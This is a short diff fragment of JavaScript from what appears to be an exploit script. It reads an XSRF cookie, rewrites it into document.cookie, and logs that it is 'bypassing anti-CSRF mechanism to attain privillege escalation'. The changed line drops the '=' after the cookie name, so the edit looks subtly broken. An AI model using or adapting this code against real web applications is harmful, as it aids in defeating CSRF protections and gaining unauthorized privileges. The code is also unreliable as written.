@@ -13,7 +13,7 @@ function readCookie(name) {
 console.log("XSRF-Token read successfully!");
 console.log("extracting the token..");
 var extract = readCookie('xsrf');
-document.cookie = "xsrf=" + extract;
+document.cookie = "XSRF-TOKEN" + extract;
 console.log("extracted and written to DOM document.cookie =" + document.cookie);
 console.log("bypassing anti-CSRF mechanism to attain privillege escalation");
 history.pushState('', '', '/');
